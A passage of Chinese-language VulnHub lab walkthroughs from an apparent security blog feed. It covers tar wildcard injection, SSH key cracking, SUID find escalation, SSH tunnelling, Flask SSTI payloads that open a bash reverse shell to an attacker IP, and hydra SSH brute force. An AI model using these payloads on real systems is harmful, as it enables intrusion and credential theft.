0&gt;&amp;1’<br>\nEOF</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1016.png\" alt></p>\n<p>这里的 ip 我做了别名并且加入到了环境变量里边，对 ifconfig 的结果做了过<br>\n滤，所以有这么一个奇怪的命令</p>\n<p>echo “” &gt; “–checkpoint-action=exec=sh <span class=\"exturl\" data-url=\"aHR0cDovL2V4cC5zaA==\">exp.sh</span>”<br>\necho “” &gt; --checkpoint=1<br>\ntar -cf tar_shell.tar ./*</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1017.png\" alt></p>\n<p>–checkpoint [=NUMBER] 每第 NUMBER 条记录显示进度消息（默认为 10 ）<br>\n–checkpoint-action=ACTION 在每个检查点上执行 ACTION<br>\n 意味着对方去使用 tar 的时候会执行我们的 exp.sh 从而将 shell 反弹出来</p>\n<p>将 exp.sh 上传到网站上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1018.png\" alt></p>\n<p>上传成功后，没多长时间我们就接受到了反弹的 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1019.png\" alt></p>\n<p>将接受到的 shell 变成一个标准的 shell 终端</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1020.png\" alt></p>\n<h3 id=\"查看计划任务看是什么情况造成这个漏洞的\"><a class=\"markdownIt-Anchor\" href=\"#查看计划任务看是什么情况造成这个漏洞的\">#</a> 查看计划任务看是什么情况造成这个漏洞的</h3>\n<p>crontab -l | tail -n 1</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1021.png\" alt></p>\n<p>可见靶机上有 tar - cvf 的压缩命令的定时任务被定期执行</p>\n<h3 id=\"003-ssh私钥密码破解源码编译john软连接配置全局命令\"><a class=\"markdownIt-Anchor\" href=\"#003-ssh私钥密码破解源码编译john软连接配置全局命令\">#</a> 003 ssh 私钥密码破解，源码编译 john，软连接配置全局命令</h3>\n<p>收集服务器的相关信息，如 id 查看用户组，查看 linux 的版本，查看 pkexec 是<br>\n否存在，上传 pspy 监控，上传 linpeas 监控服务器上的敏感信息，寻找服务器<br>\n的权限设置错误，查找 s 权限的文件，看有无端口敲门漏洞，看端口信息是否<br>\n可做隧道，脏牛提权，敏感的配置文件信息，定时任务等</p>\n<p>对上述做了全面信息收集后，并没有找到可利用的点，继续找，找到了 ssh 配<br>\n对的信息，可以尝试利用此 ssh 私钥连接到其他用户。<br>\ncat ~/.ssh/id_rsa</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1022.png\" alt></p>\n<p>看到这个 ssh 私钥文件内容比正常无密码的 ssh 要多一点，怀疑有密钥上有一层<br>\n密码，需要通过相关工具来破解出密钥的密码</p>\n<p>查看靶机上总共有哪几个用户<br>\n cat /etc/passwd | grep bash</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1023.png\" alt></p>\n<h3 id=\"我们就是要用这个私钥文件分别配对四个用户进行免密登陆\"><a class=\"markdownIt-Anchor\" href=\"#我们就是要用这个私钥文件分别配对四个用户进行免密登陆\">#</a> 我们就是要用这个私钥文件分别配对四个用户进行免密登陆</h3>\n<p>将私钥文件发送至我们的 kali 攻击机<br>\n scp id_rsa <span class=\"exturl\" data-url=\"bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjc4\">parallels@192.168.31.78</span>:/tmp/tmp</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1024.png\" alt></p>\n<h3 id=\"尝试用此私钥登陆对方服务器时提醒我们需要输入密码\"><a class=\"markdownIt-Anchor\" href=\"#尝试用此私钥登陆对方服务器时提醒我们需要输入密码\">#</a> 尝试用此私钥登陆对方服务器时，提醒我们需要输入密码</h3>\n<p>ssh -i id_rsa <span class=\"exturl\" data-url=\"bWFpbHRvOmJhY2t1cHBlckAxOTIuMTY4LjMxLjg0\">backupper@192.168.31.84</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1025.png\" alt></p>\n<p>破解 ssh 私钥的密码首先想到的就是 john 工具<br>\n先用 ssh 2 john 将私钥文件转化为 john 可识别的文件<br>\n ssh2john id_rsa &gt; id_rsa_hash</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1026.png\" alt></p>\n<p>再用 john 去破解私钥的 hash 文件<br>\n john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1027.png\" alt></p>\n<p>没有爆破出来，这个 john 工具出现了问题，干脆删了它，重新编译一个 john</p>\n<p>并不知道 john 是以何种方式安装的，可以尝试打印其路径，删除其二进制文<br>\n件，或者先用 apt 源尝试卸载 john<br>\nsudo apt remove john</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1028.png\" alt></p>\n<p>看来就是通过 apt 源中下载的 john，将其卸载干净之后，再次输入 john 的命令<br>\n判断出来此服务器目前没有了此命令</p>\n<p>下一步就是通过源码编译 john，一般的命令在 github 或者官网上寻找<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4=\"> https://github.com/openwall/john</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1029.png\" alt></p>\n<p>wget <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYXJjaGl2ZS9yZWZzL3RhZ3MvMS45LjAtSnVtYm8tMS56aXA=\">https://github.com/openwall/john/archive/refs/tags/1.9.0-Jumbo-1.zip</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1030.png\" alt></p>\n<p>cd john-1.9.0-Jumbo- 1<br>\n 在 src 文件夹下配置：./configure</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1031.png\" alt></p>\n<p>同一文件下使用 make 命令编译</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1032.png\" alt></p>\n<p>在 run 文件夹下使用: ./john<br>\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1033.png\" alt></p>\n<p>破解得到 ssh 私钥文件的密码是 samantha1</p>\n<p>将我们编译成功的 john 配置到全局，以软连接的方式强制放到 /usr/bin/john<br>\nsudo ln -sf ~/Desktop/redteam/john/john-1.9.0-Jumbo-1/run/john /usr/bin/john</p>\n<ul>\n<li>s 表示添加软连接，-f 表示强制添加，第一个位置是原位置，第二个位置是添<br>\n加了软连接之后的位置</li>\n</ul>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1034.png\" alt></p>\n<p>输入 john 之后可以看到此命令已经变成全局命令了</p>\n<p>凭借私钥及其密码 samantha1 依次尝试前面得到服务器四个有 bash 的用户登<br>\n陆，最终凭借 jaap 用户登录到了服务器<br>\n ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmphYXBAMTkyLjE2OC4zMS44NA==\">jaap@192.168.31.84</span> - i id_isa</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1035.png\" alt></p>\n<h3 id=\"004-用户组权限利用相关文件漏洞提权推理\"><a class=\"markdownIt-Anchor\" href=\"#004-用户组权限利用相关文件漏洞提权推理\">#</a> 004 用户组权限利用，相关文件漏洞提权推理</h3>\n<p>拿到 jaap 的权限之后，我们同样是没有一些通用的提权方式提权的，需要翻阅<br>\n文件，看靶机设计者给了我们哪些文件，找到主目录下有两个敏感文件，一个<br>\n是 s 权限的 find 命令，另一个是 startserver.sh 的脚本</p>\n<p>ls - Alh 看到 find 属于 jaap 用户和 remnie 用户组<br>\n尝试是否可以用 remnie 的权限使用 find 提权<br>\n sudo -u remnie ./find. -exec /bin/bash -p ; -quit<br>\n 没有 sudo 权限，就只能借用 jaap 来执行从而拿到 remnie 的用户组权限<br>\n./find. -exec /bin/sh -p ; -quit</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1036.png\" alt></p>\n<p>有了 remnie 的用户组权限，就可以进入到其用户目录下，查看到有段提示<br>\n说是在本地的某个端口处有一些问题</p>\n<p>查看到 scripts 中的 start.sh 中有一些代码<br>\n使用 /tmp/start 创建一个变量文件名，<br>\n如果文件开始在那里，将使用 ps 命令从进程运行的 grep 形式的 <span class=\"exturl\" data-url=\"aHR0cDovL3NlcnZlci5weQ==\">server.py</span>，<br>\n如果 <span class=\"exturl\" data-url=\"aHR0cDovL3NlcnZlci5weQ==\">server.py</span> 没有运行，它将运行它，如果是，则它会回显该消息。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1037.png\" alt></p>\n<h3 id=\"查看一下当前有哪些端口在运行记录一下\"><a class=\"markdownIt-Anchor\" href=\"#查看一下当前有哪些端口在运行记录一下\">#</a> 查看一下当前有哪些端口在运行，记录一下</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1038.png\" alt></p>\n<p>上传 pspy 监控，发现的确没有 server.py 被执行</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1039.png\" alt></p>\n<p>于是我们接下来就需要去操作得到 /tmp/start 这个文件，记得之前在 jaap 用户中<br>\n找到过一个 startserver.sh 的文件，去看一看这个文件<br>\n这个文件就是用来将 1 输入到 /tmp/start 中的，之后后看 pspy 监控</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1040.png\" alt></p>\n<p>Pspy 中监听到了 remnie 用户下的 start.sh 执行了，判断出此时靶机上的某个端<br>\n口被打开了，看一看目前开放的端口有哪些</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1041.png\" alt></p>\n<h3 id=\"此时本地端口-8787-成功被打开了\"><a class=\"markdownIt-Anchor\" href=\"#此时本地端口-8787-成功被打开了\">#</a> 此时本地端口 8787 成功被打开了</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1042.png\" alt></p>\n<p>服务器上有 curl 命令，用 curl 测试得到是一个网站，但是服务器不存在 iptables<br>\n 命令，无法将 8787 端口外放，意外着外界无法访问到此端口，这时候就需要做<br>\n ssh 的端口转发</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1043.png\" alt></p>\n<h3 id=\"005-ssh端口转发绕防火墙nohup无日志后台运行ssh穿透\"><a class=\"markdownIt-Anchor\" href=\"#005-ssh端口转发绕防火墙nohup无日志后台运行ssh穿透\">#</a> 005 ssh 端口转发绕防火墙，nohup 无日志后台运行，ssh 穿透</h3>\n<p>ssh 端口转发就是将我们访问某一个 ip:port 的流量转发至另一个 ip:port<br>\n 如下，在此我的公网 ip 地址中存在一个网站，想要通过 ssh 端口转发，将我本<br>\n地访问 localhost 的某一个端口的流量转发至这个页面</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1044.png\" alt></p>\n<p>lsof -i:7001 判断本地的 7001 端口并没有被占用<br>\n ssh -p 2121 -L 7000:localhost:80 <span class=\"exturl\" data-url=\"bWFpbHRvOnJvb3RAMS4xMTcuNTIuMjE5\">root@1.117.52.219</span> -i /etc/ssh/cloud.pem -N<br>\n 将访问本地 7000 端口的信息转发到远程主机的 80 端口上面</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1045.png\" alt></p>\n<ul>\n<li>p 表示进入服务器的端口，-L 表示转发规则，前者为本地端口，后者为远程端<br>\n口，-i 指定私钥文件进行免密，-N 表示不进入服务器</li>\n</ul>\n<h3 id=\"于是我们访问本地的-7001-端口便可以进入到公网上的页面\"><a class=\"markdownIt-Anchor\" href=\"#于是我们访问本地的-7001-端口便可以进入到公网上的页面\">#</a> 于是，我们访问本地的 7001 端口便可以进入到公网上的页面</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1046.png\" alt></p>\n<h3 id=\"假如远程主机在-9888-端口部署了一个服务器但是防火墙并没有开放这个端口\"><a class=\"markdownIt-Anchor\" href=\"#假如远程主机在-9888-端口部署了一个服务器但是防火墙并没有开放这个端口\">#</a> 假如远程主机在 9888 端口部署了一个服务器，但是防火墙并没有开放这个端口，</h3>\n<p>如果本地想要访问这个 9888 ，就可以用上面的案例来绕过防火墙进行 ssh 访问。</p>\n<p>可以使用 nohup 进行后台运行<br>\n nohup ssh -p2121 -L 7001:localhost:80 <span class=\"exturl\" data-url=\"bWFpbHRvOnJvb3RAMS4xMTcuNTIuMjE5\">root@1.117.52.219</span> -i /etc/ssh/cloud.pem -N &amp;<br>\n 使用一句话命令直接清理本地的 7001 端口<br>\n lsof -i: 7001 | awk ‘{print $2}’ | grep -v ‘PID’ | uniq | xargs kill - 9</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1047.png\" alt></p>\n<p>nohup 无日志产生的后台运行如下<br>\n nohup java -jar ruoyi-admin.jar &gt;/dev/null 2&gt;&amp;1 &amp;</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1048.png\" alt></p>\n<h3 id=\"我们通过端口转发来将我们本地访问-8787-端口时进入到靶机的-8787-界面从\"><a class=\"markdownIt-Anchor\" href=\"#我们通过端口转发来将我们本地访问-8787-端口时进入到靶机的-8787-界面从\">#</a> 我们通过端口转发来将我们本地访问 8787 端口时进入到靶机的 8787 界面，从</h3>\n<h3 id=\"而绕过防火墙规则靶机上需要确定开放了-8787\"><a class=\"markdownIt-Anchor\" href=\"#而绕过防火墙规则靶机上需要确定开放了-8787\">#</a> 而绕过防火墙规则，靶机上需要确定开放了 8787</h3>\n<p>在我们的主机上执行: ssh -L 8787:127.0.0.1:8787 -i id_rsa jaap@192.168.31. 85 - N<br>\n 于是我门主机打开 8787 的页面就进入到了靶机对应的窗口中</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1049.png\" alt></p>\n<p>接下来转变为对这个端口所在的 web 的测试</p>\n<p>既然提到了 ssh 的端口转发，不得不说一下 ssh 的内网穿透<br>\n可以将内网的服务穿透到公网上去，实现如下<br>\n user1 mac: lsof -i:1122<br>\nuser2 kali: ssh -Nf -R *:1122:localhost:22 <span class=\"exturl\" data-url=\"bWFpbHRvOmNoZW50dW9AMTkyLjE2OC4zMS4xOQ==\">chentuo@192.168.31.19</span></p>\n<ul>\n<li>R 表示远程端口转发，-N 表示不执行，-f 后台运行<br>\n这条命令将指定 user 2 的 1122 端口连接到 user 1 的 22 端口<br>\n user3 windows: ssh -p 1122 <span class=\"exturl\" data-url=\"bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjE5\">parallels@192.168.31.19</span></li>\n</ul>\n<p>user3 通过连接 user1 的 1122 端口连接到了 user2 上<br>\n下图中从上至下分别表示 mac，kali，windows 三个机器</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1050.png\" alt></p>\n<p>即 user 1 相当于一个公网跳板，一个内网的机器连接这个跳板就可以连接到另<br>\n外一个内网的机器，user 3 连接到公网跳板的流量被转发到了另一台内网机器</p>\n<h3 id=\"006-ssti反弹shell被过滤后的绕过\"><a class=\"markdownIt-Anchor\" href=\"#006-ssti反弹shell被过滤后的绕过\">#</a> 006 SSTI 反弹 shell，被过滤后的绕过</h3>\n<h3 id=\"打开-1-270018787开始测试网站漏洞\"><a class=\"markdownIt-Anchor\" href=\"#打开-1-270018787开始测试网站漏洞\">#</a> 打开 1 27.0.0.1:8787 开始测试网站漏洞</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1051.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">是由py语言写的，并且是flask框架，可以测试SSTI模板注入</span><br><span class=\"line\"></span><br><span class=\"line\">[http://127.0.0.1:8787/?name=&#123;&#123;10*10&#125;&#125;](http://127.0.0.1:8787/?name=&#123;&#123;10*10&#125;&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">![](/N1h1l157/VULNHUB/image-1052.png)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">## 回显是计算结果，表示存在此模板注入</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">利用SSTI模板注入在反弹shell到kali机器上</span><br><span class=\"line\">[http://127.0.0.1:8787/?name=](http://127.0.0.1:8787/?name=) &#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp;</span><br><span class=\"line\">/dev/tcp/192.168.31.83/4444 &gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">![](/N1h1l157/VULNHUB/image-1053.png)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">## 反弹失败可能是采用了过滤机制</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">利用url编码绕过过滤机制，http://www.jsons.cn/urlencode上进行url编码转化</span><br><span class=\"line\"></span><br><span class=\"line\">![](/N1h1l157/VULNHUB/image-1054.png)</span><br><span class=\"line\"></span><br><span class=\"line\">将上述中用来反弹shell的代码进行url编码后得到如下网址</span><br><span class=\"line\">[http://127.0.0.1:8787/?name=](http://127.0.0.1:8787/?name=) %7B%25%20import%20os%20%25%7D%7B%7Bos.s</span><br><span class=\"line\">ystem(&#x27;bash%20-c%20%22bash%20-</span><br><span class=\"line\"><span class=\"meta prompt_\">i%</span><span class=\"language-bash\">20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.83%2F4444%20%3E%261%22<span class=\"string\">&#x27;)</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">%</span><span class=\"language-bash\"><span class=\"string\">7D%7D</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">继续访问此网站用来反弹shell，依然是无效果的</span><br><span class=\"line\"></span><br><span class=\"line\">![](/N1h1l157/VULNHUB/image-1055.png)</span><br><span class=\"line\"></span><br><span class=\"line\">换种方式来执行，在对方服务器上写一个sh的反弹脚本，利用SSTI去读取这</span><br><span class=\"line\">个脚本并执行</span><br><span class=\"line\">cat &gt; /tmp/shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"string\">! /bin/bash</span></span></span><br><span class=\"line\">bash - c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\">![](/N1h1l157/VULNHUB/image-1056.png)</span><br><span class=\"line\"></span><br><span class=\"line\">访问如下网址用另外的方式来反弹shell</span><br><span class=\"line\">[http://127.0.0.1:8787/?name=&#123;&#123;request.application.__globals__.__builtins__.__impor](http://127.0.0.1:8787/?name=&#123;&#123;request.application.__globals__.__builtins__.__impor)</span><br><span class=\"line\"><span class=\"meta prompt_\">t__(%</span><span class=\"language-bash\"><span class=\"string\">27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&#125;&#125;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">![](/N1h1l157/VULNHUB/image-1057.png)</span><br><span class=\"line\"></span><br><span class=\"line\">反弹虽然成功了，但却立即断开了，原因不明，将机器重新启动后，shell成功</span><br><span class=\"line\">被反弹出来，接收到了一个稳定的shell</span><br></pre></td></tr></table></figure>\n<p>将所得到的 shell 利用如下三行代码输出为标准的 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1058.png\" alt></p>\n<p>现在我们成功拿到了 remnie 用户的 shell</p>\n<p>remnie 用户下的 server.py 文件就是形成此漏洞的原因</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1059.png\" alt></p>\n<h3 id=\"007-awk配合cut使用vim不进入写模式更改文件二进制解密\"><a class=\"markdownIt-Anchor\" href=\"#007-awk配合cut使用vim不进入写模式更改文件二进制解密\">#</a> 007 awk 配合 cut 使用，vim 不进入写模式更改文件，二进制解密</h3>\n<h3 id=\"我们现在仍然在一个既没有内核漏洞可以提权也没有相关权限设置错误提权\"><a class=\"markdownIt-Anchor\" href=\"#我们现在仍然在一个既没有内核漏洞可以提权也没有相关权限设置错误提权\">#</a> 我们现在仍然在一个既没有内核漏洞可以提权，也没有相关权限设置错误提权</h3>\n<p>的机器上，只能寻找于 remnie 相关的文件来找突破口，看到用户主目录下有一<br>\n个 server.conf 的配置文件，进行查看之后看到了如下信息。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1060.png\" alt></p>\n<p>提示说是一个连接 root 服务的文件，这个文件中最右边的这些二进制数字比较<br>\n可疑，尝试将他们进行二进制解密</p>\n<p>将这些二进制数字利用 linux 命令做分隔符打印出来<br>\n cat server.conf | cut -d ‘|’ -f 2 &gt; binary.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1061.png\" alt></p>\n<p>Vim 不进入写模式将换行符换为空<br>\n vim 1.txt +&quot;:% s/\\n//g&quot; +wq</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1062.png\" alt></p>\n<p>From binary 解密二进制之后得到了十六进制的如下数据</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1063.png\" alt></p>\n<p>From magic 解密之后得到了 root 账户的密码<br>\n root:-!F8h2LMr&lt;[n]`N] Kq</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1064.png\" alt></p>\n<p>利用如下命令切换至 root 用户，成功拿到了 root 账户的权限</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1065.png\" alt></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/134%20GROTESQUE2/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/134%20GROTESQUE2/",
            "title": "VULNHUB 34 GROTESQUE2",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTIsNjczLw==\">https://www.vulnhub.com/entry/grotesque-2,673/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGVuZXItc3FwL3AvMTQ4Mjc3NzMuaHRtbA==\">https://www.cnblogs.com/pener-sqp/p/14827773.html</span></p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31.135<br>\n 靶机 GROTESQUE2：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep ‘a0’ ; rm -f 1.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-893.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 73</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n sudo nmap - p- 192.168.31. 73</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-894.png\" alt></p>\n<p>à 靶机开放端口 2 2…600 基本上都开放<br>\n这么多网站都开放的肯定是有问题的，需要打开几个找问题所在</p>\n<h3 id=\"002-信息收集wget批量下载awksort排序分析\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集wget批量下载awksort排序分析\">#</a> 002 信息收集，wget 批量下载，awk/sort 排序分析</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 73 / 进行信息收集<br>\n同时打开打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNzM6\">http://192.168.31.73:</span> 9999 / 进行信息收集</p>\n<h3 id=\"对比下面两个网站发现一模一样没有任何区别\"><a class=\"markdownIt-Anchor\" href=\"#对比下面两个网站发现一模一样没有任何区别\">#</a> 对比下面两个网站发现一模一样没有任何区别</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-895.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-896.png\" alt></p>\n<h3 id=\"于是猜测从-22-到-600-这么多页面基本上都是一模一样的唯有一个不同而那\"><a class=\"markdownIt-Anchor\" href=\"#于是猜测从-22-到-600-这么多页面基本上都是一模一样的唯有一个不同而那\">#</a> 于是猜测从 22 到 600 这么多页面基本上都是一模一样的，唯有一个不同，而那</h3>\n<p>个不同的页面需要通过脚本或者其他的方式筛选出来，可以用 burp 的方式访问<br>\n不同端口的网站，看返回的数据包的长度来找，也可以用 wget 批量下载页面，<br>\n判断下载文件的大小<br>\n for i in {23…600};do wget 192.168.31.73:<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mo>−</mo><mi>O</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">i -O index</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.74285em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span></span></span></span>i;done<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-897.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-898.png\" alt></p>\n<p>用一些 linux 命令对下载到的文件进行排序<br>\n ls -Al | sort | awk ‘{print $5,$9}’ | tail -n10</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-899.png\" alt></p>\n<h3 id=\"看到在-258-端口处的网站有不一样的返回结果\"><a class=\"markdownIt-Anchor\" href=\"#看到在-258-端口处的网站有不一样的返回结果\">#</a> 看到在 258 端口处的网站有不一样的返回结果</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 73 :258/</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-900.png\" alt></p>\n<p>给出提示，ssh 的用户名可能是如下这几个</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-901.png\" alt></p>\n<h3 id=\"审查源代码发现了一个图片的地址\"><a class=\"markdownIt-Anchor\" href=\"#审查源代码发现了一个图片的地址\">#</a> 审查源代码发现了一个图片的地址</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-902.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 73 :258/emoji/hand.png</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-903.png\" alt></p>\n<h3 id=\"大致一看是没有什么特殊的但是仔细看图片后发现隐藏着一些敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#大致一看是没有什么特殊的但是仔细看图片后发现隐藏着一些敏感信息\">#</a> 大致一看是没有什么特殊的，但是仔细看图片后，发现隐藏着一些敏感信息</h3>\n<p>在图片的中间有一串 hash 数据：b6e705ea1249e2bb7b0fd7dac9fcd1b3</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-904.png\" alt></p>\n<p>解密此 md 5 加密，得到密码为 solomon 1</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-905.png\" alt></p>\n<p>到此已经收集到了几个可能的用户名和一个 ssh 密码</p>\n<h3 id=\"003-hydra爆破sshpspylinpeas定时任务提权\"><a class=\"markdownIt-Anchor\" href=\"#003-hydra爆破sshpspylinpeas定时任务提权\">#</a> 003 hydra 爆破 ssh，pspy，linpeas，定时任务提权</h3>\n<p>hydra -L user.txt -p solomon1 ssh://192.168.31.22 -t 4</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-906.png\" alt></p>\n<p>得到一组 ssh 的登陆凭据 angel:solomon1<br>\nssh <span class=\"exturl\" data-url=\"bWFpbHRvOmFuZ2VsQDE5Mi4xNjguMzEuNzM=\">angel@192.168.31.73</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-907.png\" alt></p>\n<p>上传 pspy 监控看有没有被定时执行的任务，发现有两个脚本定时执行</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-908.png\" 